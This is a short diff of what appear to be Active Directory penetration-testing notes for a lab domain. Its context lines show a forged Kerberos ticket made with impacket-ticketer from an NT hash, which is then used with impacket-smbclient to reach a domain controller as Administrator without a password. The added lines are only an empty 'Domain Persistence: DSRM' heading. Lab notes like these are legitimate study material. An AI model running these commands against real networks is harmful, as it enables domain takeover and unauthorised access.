@@ -118,3 +118,9 @@ impacket-ticketer -nthash c6ba25c393c4e412825e6c476c7f2e12 \
 export KRB5CCNAME=Administrator.ccache
 impacket-smbclient MARVEL.LOCAL/Administrator@HYDRA-DC.marvel.local -k -no-pass
 ```
+
+
+#### Domain Persistence: DSRM
+```bash
+
+```
